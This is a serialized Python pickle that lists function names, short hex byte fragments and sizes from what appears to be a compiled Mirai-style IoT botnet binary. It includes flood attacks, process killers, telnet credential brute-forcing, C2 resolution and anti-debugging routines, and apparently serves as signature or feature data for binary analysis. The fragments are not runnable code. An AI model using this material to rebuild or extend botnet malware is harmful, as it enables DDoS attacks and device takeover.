(lp0
(S'_init'
p1
S''
p2
L20L
tp3
a(S'__do_global_dtors_aux'
p4
S'86962f11e690612221'
p5
L76L
tp6
a(S'frame_dummy'
p7
S'e6122221110b00d46118110e896f4ff6410909090909090909090909e34ff600'
p8
L74L
tp9
a(S'_start'
p10
S'00f62f462f07d02f040406d1410905'
p11
L30L
tp12
a(S'attack_app_http'
p13
S'86962fcbff4fcc911843'
p14
L15596L
tp15
a(S'attack_init'
p16
S'227fd1e4200b00d1e41d001a0b00d1e417d14109190313d1410917d113d14109150ed141091306e40b0b00d1e4080b00d1e40500e160044f0b09'
p17
L136L
tp18
a(S'attack_kill_all'
p19
S'227f'
p20
L114L
tp21
a(S'attack_parse'
p22
S'86227f61e0491161e05811'
p23
L1110L
tp24
a(S'attack_start'
p25
S'227f61e04c116361e079f957610c20610821617043d1410961e00d7150ffe01d8b093a0b0061e00e1161e01e50ff350061e01e5118121c130b00d1410903d1410900290b00'
p26
L306L
tp27
a(S'attack_get_opt_str'
p28
S'e861d81161d811611021610821'
p29
L156L
tp30
a(S'attack_get_opt_int'
p31
S'227f'
p32
L124L
tp33
a(S'attack_get_opt_ip'
p34
S'227f'
p35
L122L
tp36
a(S'add_attack'
p37
S'227f'
p38
L144L
tp39
a(S'free_opts'
p40
S'227f61cc711161cc711161cc7151183789'
p41
L146L
tp42
a(S'attack_gre_ip'
p43
S'86227f'
p44
L2190L
tp45
a(S'attack_gre_eth'
p46
S'86227f'
p47
L2414L
tp48
a(S'attack_tcp_syn'
p49
S'86227f'
p50
L2444L
tp51
a(S'attack_tcp_ack'
p52
S'86227f'
p53
L2302L
tp54
a(S'attack_tcp_stomp'
p55
S'8622911843'
p56
L3284L
tp57
a(S'attack_udp_generic'
p58
S'86227f'
p59
L1640L
tp60
a(S'attack_udp_vse'
p61
S'86227f'
p62
L1540L
tp63
a(S'attack_udp_dns'
p64
S'86227f'
p65
L2042L
tp66
a(S'attack_udp_plain'
p67
S'86962f227f'
p68
L994L
tp69
a(S'get_dns_resolver'
p70
S'2291181ee4d141091ee4e5d1410903310b00fc3111e4d141095091fc3151118bfc315349914690fc3044923323d141093d1191fc3151130b00e4d141091fe4e5d141092b1c91fc312303d141091d11e4d141091691fc318b92fc32e12292fc32e12292fc32511e120808f7fb4000fb40000d40000c00003150626193fc331c105d91fc3161188b10885091fc316009094c92fc32e122fc31608889fc3162e1328b91fc3162e1328991fc31137291fc315110342913912797fc371c2c20fc32532d327323d1410910fc32532d30e10292fc32e122a03f08f708000092fc3291fc3151011291fc3192fc32532c1301201808130b001f45a00b00c90003026018026131'
p71
L688L
tp72
a(S'checksum_generic'
p73
S'f47f61cc711161cc7111e12f16a0cc715111616222'
p74
L148L
tp75
a(S'checksum_tcpudp'
p76
S'227f61e44a1161e4591161e477610421'
p77
L426L
tp78
a(S'killer_init'
p79
S'862291181d9115d14109151192fc32e112d14109090208124103ff09c01041580c0000e122e112e4d14109034ed1410917e4d141090391fc317121e4e5e6d1410986838889fc3162fc315113103fd1410972fc3151133c0b00e4d1410903340b00e4d141090391fc317121e4e5e6d141095291fc3111fc3150fffc3162fc31511310250091fc315113220b004109330b006113d121e12200121b0b0061181406e4d1410906e4e5d14109030b0091fc3111fc3151180106e4d1410908801040001bb4410041004200a7400000fb400011'
p80
L1604L
tp81
a(S'killer_kill'
p82
S'22d16113040b004f0b09'
p83
L22L
tp84
a(S'killer_kill_by_port'
p85
S'8622911843623321b6b3fc32b31323d14109ad91a8fc33a81323d14109a332a0e550d141099a12e11233101323d14109877dfc3318801274fc321161130b0061139168311013d141096832130b00885e915493fc3310914f93fc3302214992fc3201624393fc3303213d316200103f913532e122912f93fc331372e122e4d1410907e4d1410909190b00d100180b001191fc3150ff090012b0099232e11292fc32e112a0a010'
p86
L2266L
tp87
a(S'has_exe_access'
p88
S'229118b2fc32331dd1410907e4d1410906e4e5d141099e91fc3151d141090362fc311341098c2c0313d141098003d141090362fc333113e4e5d141096afc3137d141090362fc33fc31135793fc3313310b00fc3111fc3150ff123fa0fc3151130b00e4d1410907e4d141092591313223d14109282550ff1291fc31511c00101816911318113c13120b00e12f60030b09'
p89
L364L
tp90
a(S'memory_scan_match'
p91
S'229118706e92fc32421132e12292fc3212003500fc31113150ff1221d141090d41090ee4d14109e4d1410910d1410940913b0c13d1410991fc3111320dd141092a2a2c0ee416d141091e91fc311f911792fc32e4100b0091fc3192fc321013d141090691fc311110ef3bfcdcd8d4d0ccef09cc0d4000fb40007efc3217577b79fc3278fc315375fc31512313d14109032189099192fc32165761915f92fc325e91fc31535b91fc31512313d1410903214c914c92fc321592fc324691fc31534391fc312313d1410903218b34fc3214311c91fc31532b2313d1410903218b1cfc3213911792fc321691fc3153132313d14109032132e122a03ce0fc'
p92
L658L
tp93
a(S'mem_exists'
p94
S'e8711161d81161d81161d811'
p95
L190L
tp96
a(S'main'
p97
S'86229118c131bc335511e11235125ad14109ab91a796fc6c3157d14109a3377c1353d141099a31e4004fd1410911014ed141094dd1d141094bd1024bd141097efc3111fc3150ff1344d1410970fc3111fc3150ff92fc320112623c61915b95fc3533390b003151130b00fc32e112130b00d14109330233021132130b00d111300b0062d171212a152a0b006118030b00d1410927d141091a20240b00910cfc377c1650020905323a40f97c0c00084c0609204100001d410000b841000d41000400410033e80741000042001aa41a30004000be410061130b00e130ab91ab93fc33156223d141099d919d95fc350412919696fc6c3161130b00d141094ad14109030341137291fc31323142d1410974fc3132e1026afc377c1592fc3223d141093500d1624221f1511cf1533c1c033508624b91fc3132fc3127d1410991fc3132e10291fc31e4220b00e4d1410991fc31e41ed141092511511391fc31011317d1410917d1e401140b00e4d14109130b00e12f340940f9bc066c0648063c144000ffce004cbf40000e410000fb4000410033'
p98
L3044L
tp99
a(S'anti_gdb_entry'
p100
S'fc7f61c411d2d1220b09'
p101
L20L
tp102
a(S'resolve_cnc_addr'
p103
S'86227fe4d141090300290b00280b0061c411e4d1410961c45118378961c45111d141090361c451106113d23342095a020201182341'
p104
L178L
tp105
a(S'establish_connection'
p106
S'8622e4e5e6d141091902181288681300140b00910b83100b00d16118030b0001100812d113e6d141094ff600'
p107
L112L
tp108
a(S'teardown_connection'
p109
S'22d160ff1207d141090521e4d141094f0b09'
p110
L42L
tp111
a(S'ensure_single_instance'
p112
S'86227f'
p113
L364L
tp114
a(S'unlock_tbl_if_nodebug'
p115
S'227f61dc11613ad2e32397d1410962001d72e11262afe1226272d122711171116272d1127111256108116272d112711162001c17a01c1c6272412c12'
p116
L626L
tp117
a(S'rand_init'
p118
S'8622e4d1410903d121d1410903d141098313d1210062220b12d1611a09224ff600'
p119
L76L
tp120
a(S'rand_next'
p121
S'fc7f'
p122
L132L
tp123
a(S'rand_str'
p124
S'86227f61c861c854a0c80317328b61c82a0b0028'
p125
L210L
tp126
a(S'rand_alphastr'
p127
S'227f61fc711161fc711161'
p128
L302L
tp129
a(S'resolv_domain_to_hostname'
p130
S'227f61d81161d81161d851130b00'
p131
L268L
tp132
a(S'resolv_skip_name'
p133
S'ec7f61d44d1161d45c1161d46b'
p134
L220L
tp135
a(S'resolv_lookup'
p136
S'86229118cb91c992fc324511e4e5d141090391fc311191b9311251137291fc311152ab91a93157d14109a491fc3151130b00611391fc31512c137291fc311133000012210000122386130b0061137291fc3111fc32e112fc32e112fc32e1120b00d1e1612347726128623163332f5d91fc3161215297fc377c13300b004992fc3202112c130b0092fc3201354109039134fc33022191fc315232112f91130b0062fc31510221e4d141090391fc315104210115006291fc31512101110b006291fc31510221a20074b8efce1001400040000080ce000808764100fc31fffc31130b00e4e5e6d141095e91fc315b91fc31ff310b00915196fc6c3162fc3113102a0b0088d14109a091fc31573791fc3137913531237333d14109ff190b0091fc310313e6d141091c0322fc310413100b0092fc32910a1904fc32e112a0a8f41008ef09200041001b344100fc3153ae91fc315233411c0012a692fc320112521fe1328b52051d13919092fc3233412c1291fc311fc9010d23327308312178fc32059172fc3200196b017f6293fc339163127333e6e7d14109045391fc3111fc3150fffc315118014491fc31056392fc3233412c1291fc311fc903612340010c180100f87f6391fc31281c90982200117363830b007f91fc3111580a130b00611138a018f410efbc100840284100410040008992fc324a97fc377c1f123151137291fc311191fc3151130b00611391fc31512c137291fc311151137291fc311191fc3151116291fc31611d8b91fc31510671611d8b090d510671611dd141090819b810101040004100fc32e112fc31526d916d93fc336b3133330b005f97fc377c17511393fc33fc31512c1b5192fc32fc31511e12fc32fc31510a12315220636101611c1821d141090338312371611c2371611c1821d1410903388991fc31522371611c2371611c1821d14109040104fc32e11209b4b8ef80c340004100509c91fc3191fc31512c106233248dfc3112520317328b917ffc6c311231511191fc31511061087113d141090362fc31512191fc31511191fc31511063610832fc31511222610162fc3151204b91fc31522371611c2371611c1821d14109036293fc33512c1b1ea0fc31522f912cfc332c282313d14109232c17511393fc33512c1b1792fc3261ff2291fc31611d3289ae092398eff410ef9cef80100020601a084000ff00fc31520423291c2d91fc315101122389ad0922130b00fc31511061180531511109fc3151130b00e31ff15006977c4ff600'
p137
L2028L
tp138
a(S'resolv_entries_free'
p139
S'227f61c41161c451181461c45111218961c4511107d1410961c451130b004f0b09'
p140
L70L
tp141
a(S'recv_strip_null'
p142
S'227f61d81161d81161d81161d81161d85761d85261d85361d851237313d1410961d81161d85115'
p143
L186L
tp144
a(S'scanner_kill'
p145
S'22d16113040b004f0b09'
p146
L22L
tp147
a(S'setup_connection'
p148
S'86227f61d44b1163000012210000122361d41b50ffd41b51130b00e4e5e6d1410961d41b1161d41b50ffd41be11261d41b719213280b0061d41b5861d41b511300220b00910b831ed1410962021161d41b5261042161d41b71611d717121d1611361d41b1161d41be11261d41b52610423100a0b004ff600'
p149
L266L
tp150
a(S'get_random_ip'
p151
S'227fd1410961c86261c81061c81342610561c813426106712161c813421961077121610410607fd46104106118ce8961041060030410608804106010041060380410600a04106210068b6105623271611c5e91100d71611ce1328b610562e13271611c888b610562e1328b6105621632890961041062100810629110016104106291108b1062e1328b610562e1328900610410629116328ba00410600688a0a8ac000000008961041060078889610410600b0410601561041060168889610410601a0410601c0571611c1daf09610410601e88896104106021041060378871611c2a6104106210016104106113e3426105612822610671611c1822610771611c2b130b007f4f0b09'
p152
L626L
tp153
a(S'consume_iacs'
p154
S'227f61dc11'
p155
L660L
tp156
a(S'consume_any_prompt'
p157
S'ec7f61d44c11'
p158
L222L
tp159
a(S'consume_user_prompt'
p160
S'227f61d811'
p161
L364L
tp162
a(S'consume_pass_prompt'
p163
S'227f61d811'
p164
L276L
tp165
a(S'consume_resp_prompt'
p166
S'227f61d44c11e4d141096108e4350061d40e1161d41c137261d41c165361d41d7761d41e512313d14109ff27d14109ff123de4d14109191ed141096108e41b0b0061d40e1161d41c137261d41c165361d41d7761d41e512313d1410961d411e4d1410961d41f50ff12040961d41f511260144f0b09'
p167
L236L
tp168
a(S'add_auth_entry'
p169
S'86227f61d01161d011612146d16212e3411013d141090362d121d161042dd161233861d0516213390b0028e34113d161233361d0511c337121e24113d161233861d051621327d14109012312e34113d161233361d0511c337121d161042dd1612333d1611d71211261043dd1612333d1611d612c1d712101d121d1611d612c1d217f4ff600'
p170
L306L
tp171
a(S'random_auth_entry'
p172
S'227fd1410903d1611dd23342095a02020118610a21'
p173
L198L
tp174
a(S'report_working'
p175
S'86227f61ec711161ec711161042190d1410961ec7111'
p176
L600L
tp177
a(S'deobf'
p178
S'227f61d01161d01161d051130b0061d0510261d051127148d141090361d01161d05112637361d05261d0512333d14109'
p179
L336L
tp180
a(S'can_consume'
p181
g2
L80L
tp182
a(S'table_init'
p183
S'22d1e41ee6d14109aed113e6d14109acd1e41d4109a902a4d14109a7d1e4'
p184
L708L
tp185
a(S'table_unlock_val'
p186
S'227f'
p187
L54L
tp188
a(S'table_lock_val'
p189
S'227f'
p190
L54L
tp191
a(S'table_retrieve_val'
p192
S'f47f61cc711161cc711161cc7151032d6373d11f1361cc7151180a1f510411611361cc71512261cc715112600c0b09'
p193
L84L
tp194
a(S'add_entry'
p195
S'227f'
p196
L138L
tp197
a(S'toggle_obf'
p198
g2
L336L
tp199
a(S'util_strlen'
p200
S'f87f61c8'
p201
L82L
tp202
a(S'util_strncmp'
p203
S'227f61d81161d81161d81161d851130b0061d81161d851130b0061d81161d8'
p204
L204L
tp205
a(S'util_strcmp'
p206
S'227f61d44d1161d45c1161d41dd1410961d40e1161d41c130b0061d41161d4'
p207
L182L
tp208
a(S'util_strcpy'
p209
S'227f61cc711161cc711161cc7151130b0061cc711161cc7151137361cc715261cc71512333d1410961cc7151137f4f0b09'
p210
L86L
tp211
a(S'util_memcpy'
p212
S'ec7f61d44d1161d45c1161d46b'
p213
L122L
tp214
a(S'util_zero'
p215
S'f47f61cc711161cc7111'
p216
L84L
tp217
a(S'util_atoi'
p218
S'227f61ec711161ec7111'
p219
L672L
tp220
a(S'util_itoa'
p221
S'227f610442116104511161046011610410218be12fb609610412218b62201d716272e122610411888b610412410c62011c610412'
p222
L414L
tp223
a(S'util_memsearch'
p224
S'e461dc1161dc1161dc1161dc11'
p225
L206L
tp226
a(S'util_stristr'
p227
S'227f61e861e861e8'
p228
L358L
tp229
a(S'util_local_addr'
p230
S'227f'
p231
L184L
tp232
a(S'util_fdgets'
p233
S'227f61dc1161dc1161dc11'
p234
L206L
tp235
a(S'util_isupper'
p236
S'f87f'
p237
L56L
tp238
a(S'util_isalpha'
p239
S'f87f'
p240
L80L
tp241
a(S'util_isspace'
p242
S'f87f'
p243
L72L
tp244
a(S'util_isdigit'
p245
S'f87f'
p246
L56L
tp247
a(S'__sdivsi3_i4'
p248
S'5a442d230b'
p249
L14L
tp250
a(S'__udivsi3_i4'
p251
S'0116351a4406'
p252
L40L
tp253
a(S'fcntl'
p254
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf11312772271763304017253637362040216332705d04009a0407e60138230638f68098be32060407e6f4ff668'
p255
L164L
tp256
a(S'fcntl64'
p257
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf11312772271763304017218226012138230638f68098be320336f4ff668'
p258
L144L
tp259
a(S'chdir'
p260
S'860ce6334f6e118230638f68098be32060e34ff668'
p261
L50L
tp262
a(S'close'
p263
S'8606e32f334f6e118230638f68098be32060e34ff668'
p264
L50L
tp265
a(S'fork'
p266
S'8602e6334f6e108230638f68098be32060e34ff668'
p267
L50L
tp268
a(S'getpid'
p269
S'8614e6334f6e108230638f68098be32060e34ff668'
p270
L50L
tp271
a(S'getppid'
p272
S'8640e32f334f6e108230638f68098be32060e34ff668'
p273
L50L
tp274
a(S'ioctl'
p275
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf113127722717633040172e36013722712c38230638f68098be320336f4ff668'
p276
L144L
tp277
a(S'kill'
p278
S'862560226e128230638f68098be32060e34ff668'
p279
L50L
tp280
a(S'open'
p281
S'86f8e12f536883e30419686120711540c9bb71208a9bf1f87171f17b4a5b132c331172e07311333053110122120533c38230638f68098be320336f4ff668'
p282
L156L
tp283
a(S'creat'
p284
S'5304056ee3f64109'
p285
L18L
tp286
a(S'prctl'
p287
S'86e622936ee315308f68098b20e06f4ff668'
p288
L46L
tp289
a(S'read'
p290
S'8603e6334f6e138230638f68098be32060e34ff668'
p291
L50L
tp292
a(S'readlink'
p293
S'8655e32f334f6e138230638f68098be32060e34ff668'
p294
L50L
tp295
a(S'select'
p296
S'86e622936ee315308f68098b20e06f4ff668'
p297
L46L
tp298
a(S'setsid'
p299
S'8642e32f334f6e108230638f68098be32060e34ff668'
p300
L50L
tp301
a(S'sigprocmask'
p302
S'8658250a16348bd0400916e120a00833c38230638f68098be32060e34ff668'
p303
L76L
tp304
a(S'time'
p305
S'860d60226e118230638f68098be32060e34ff668'
p306
L50L
tp307
a(S'unlink'
p308
S'860ae6334f6e118230638f68098be32060e34ff668'
p309
L50L
tp310
a(S'write'
p311
S'8604e6334f6e138230638f68098be32060e34ff668'
p312
L50L
tp313
a(S'closedir'
p314
S'86962fa62f436a2f2260'
p315
L108L
tp316
a(S'opendir'
p317
S'86962fa62f00e622d0406e118f680b118be540011189ea230b007ed0403008178d6ae11052111229257110d0e4201a8fe5d141a30bea0c1205d0747e60e34ff66a69'
p318
L186L
tp319
a(S'readdir'
p320
S'864368e643697f6e1ae30b190b915292513117d0560b00e1a011915293582c816134'
p321
L122L
tp322
a(S'__errno_location'
p323
S'03e66ee3f600'
p324
L14L
tp325
a(S'clock'
p326
S'86e622d07f6e0be1e210d00819e34ff668'
p327
L46L
tp328
a(S'memcpy'
p329
S'632068c830e18d3175'
p330
L636L
tp331
a(S'memmove'
p332
S'864361962f58312f632f4368f87f6e411e02e1e1014b6063c903100120'
p333
L978L
tp334
a(S'memset'
p335
S'e607e16e638f5c63416b634303ff72600308f8'
p336
L124L
tp337
a(S'ntohl'
p338
S'0a43622921e344e64c6e3d4419202be3f600'
p339
L42L
tp340
a(S'ntohs'
p341
S'4d60e60c6e18401be3f600'
p342
L22L
tp343
a(S'htonl'
p344
S'0a43622921e344e64c6e3d4419202be3f600'
p345
L42L
tp346
a(S'htons'
p347
S'4d60e60c6e18401be3f600'
p348
L22L
tp349
a(S'inet_addr'
p350
S'e622d07f6e0b0803c45004e34ff600'
p351
L38L
tp352
a(S'accept'
p353
S'e622d07f6e42511e0540e30ce34ff600'
p354
L34L
tp355
a(S'bind'
p356
S'e622d07f6e42511e02620b0ce34ff600'
p357
L34L
tp358
a(S'connect'
p359
S'e622d07f6e42511e03620b0ce34ff600'
p360
L34L
tp361
a(S'getsockname'
p362
S'e622d07f6e42511e06e41e0b0ce34ff600'
p363
L34L
tp364
a(S'getsockopt'
p365
S'e622d07f6ee742e46273140b14e34ff600'
p366
L40L
tp367
a(S'listen'
p368
S'e622d07f6ee3c8e34e114004086f4ff600'
p369
L36L
tp370
a(S'recv'
p371
S'e622d07f6e42511e0a62730b106f4ff600'
p372
L36L
tp373
a(S'recvfrom'
p374
S'e6227fd06ee8e41ee91e7325186f4ff600'
p375
L44L
tp376
a(S'send'
p377
S'e622d07f6e42511e0962730b106f4ff600'
p378
L36L
tp379
a(S'sendto'
p380
S'e6227fd06ee8e41ee91e7325186f4ff600'
p381
L44L
tp382
a(S'setsockopt'
p383
S'e622d07f6ee7420ee41e6273140b14e34ff600'
p384
L40L
tp385
a(S'socket'
p386
S'e622d07f6e42511e01620b0ce34ff600'
p387
L34L
tp388
a(S'raise'
p389
S'86436822406e05e34ff668'
p390
L32L
tp391
a(S'sigaddset'
p392
S'e615'
p393
L50L
tp394
a(S'sigemptyset'
p395
S'e60005960b6e00e34ff600'
p396
L26L
tp397
a(S'signal'
p398
S'865360962fffe622911806'
p399
L156L
tp400
a(S'__sigismember'
p401
S'536373e1601d6108601fe701013de6606ee3f600'
p402
L44L
tp403
a(S'__sigaddset'
p404
S'5360ffe16242014c326e22c90d21226ff600'
p405
L40L
tp406
a(S'__sigdelset'
p407
S'5360ffe16343014c336e1fc9324200276221236ff600'
p408
L42L
tp409
a(S'malloc'
p410
S'8648242f43622f227f'
p411
L222L
tp412
a(S'calloc'
p413
S'8648242f5363e62208'
p414
L86L
tp415
a(S'free'
p416
S'8648242fa62fb6'
p417
L208L
tp418
a(S'realloc'
p419
S'865825b6436b53e622'
p420
L234L
tp421
a(S'__heap_alloc'
p422
S'52'
p423
L98L
tp424
a(S'__heap_alloc_at'
p425
S'4262762f25633156318d2019021b128901225218030d24a032055228d8336ff600'
p426
L102L
tp427
a(S'__heap_link_free_area'
p428
S'e668155116027800f600'
p429
L34L
tp430
a(S'__heap_link_free_area_after'
p431
S'e6686e511601620b09'
p432
L26L
tp433
a(S'__heap_free'
p434
S'865360962f6c302f0022685231892871a0830c06318d3169238d610c1032560d57780e8d72280c100873730ed1410905d10b9228a0037962930b9360e34ff669'
p435
L166L
tp436
a(S'abort'
p437
S'86e622913018305c980b6eec38e2a0'
p438
L200L
tp439
a(S'atol'
p440
S'0400e60a6ee3f64109'
p441
L18L
tp442
a(S'strtol'
p443
S'0301e66ee3f64109'
p444
L16L
tp445
a(S'_stdlib_strto_l'
p446
S'864368a62fb6'
p447
L304L
tp448
a(S'sleep'
p449
S'8648242fa62fb6e622911802009893200001ff611141f98d8d1148d032391f124093118fe49843d040836b0be520932001ff611141f98d94113534401c11'
p450
L332L
tp451
a(S'__uClibc_fini'
p452
S'86152f1822486e05d1601e014109'
p453
L86L
tp454
a(S'__pthread_return_0'
p455
S'e6006ee3f600'
p456
L14L
tp457
a(S'_pthread_cleanup_push_defer'
p458
S'e66ee3f600'
p459
L12L
tp460
a(S'__check_one_fd'
p461
S'865368e64369406eff090b903089d14109e34ff669'
p462
L56L
tp463
a(S'__uClibc_init'
p464
S'e622d26118120c121222010a1804e34ff64109e34ff600'
p465
L60L
tp466
a(S'sbrk'
p467
S'86962fa62f436a2f'
p468
L72L
tp469
a(S'__socketcall'
p470
S'86e32f334f6e128230638f68098be32060e34ff668'
p471
L50L
tp472
a(S'_exit'
p473
S'86962f43696e0c01931116308f68098b20af09'
p474
L40L
tp475
a(S'fstat'
p476
S'866ce32f332f53697f6ee3128230638f68098be3202333d10b407e60e34ff66a69'
p477
L80L
tp478
a(S'__getdents'
p479
S'865368b6'
p480
L120L
tp481
a(S'__getdents64'
p482
S'86632f06712f092f082f536b632f2293'
p483
L248L
tp484
a(S'getegid'
p485
S'86e622936e33c38230638f68098be32060e34ff668'
p486
L50L
tp487
a(S'geteuid'
p488
S'86e622936e33c38230638f68098be32060e34ff668'
p489
L50L
tp490
a(S'getgid'
p491
S'86e622936e33c38230638f68098be32060e34ff668'
p492
L50L
tp493
a(S'getuid'
p494
S'86e622936e33c38230638f68098be32060e34ff668'
p495
L50L
tp496
a(S'lseek64'
p497
S'86632f73e653227fe9e323c31c16308f68098b20a003041ae3c81f51086f4ff669'
p498
L86L
tp499
a(S'nanosleep'
p500
S'86e622936e33c38230638f68098be32060e34ff668'
p501
L50L
tp502
a(S'times'
p503
S'862be6334f6e118230638f68098be32060e34ff668'
p504
L50L
tp505
a(S'__xstat64_conv'
p506
S'8660e62f5368b683e5d04f0b6e9d5193635b8340761872500010916121619455122d187754181816799b529551349c531516b6a718180e186f4ff66bf668'
p507
L128L
tp508
a(S'__xstat_conv'
p509
S'8658e62f5368b683e5d06e0b7b519363187793601b0c9651936a731c0e7a512d1d51000118621b612d6154181b7627181841186f4ff66bf668'
p510
L138L
tp511
a(S'inet_aton'
p512
S'8648242fa62f536a2f'
p513
L194L
tp514
a(S'sigaction'
p515
S'865825a62f00b6632f436b3b6e385661ec38123393617c13121818e614b30be72a8d690ed06104180b7553a37111119793607ce34ff66bf668'
p516
L144L
tp517
a(S'_dl_aux_init'
p518
S'475205536e220332e3f600'
p519
L24L
tp520
a(S'_brk'
p521
S'862d60226e118230638f68098be32060e34ff668'
p522
L50L
tp523
a(S'__init_brk'
p524
S'860d612221d040000802068bd040090c1201e34ff668'
p525
L56L
tp526
a(S'__syscall_rt_sigaction'
p527
S'86e622936e33c38230638f68098be32060e34ff668'
p528
L50L
tp529
a(S'__do_global_ctors_aux'
p530
S'8609e6'
p531
L38L
tp532
a(S'_fini'
p533
g2
L20L
tp534
a.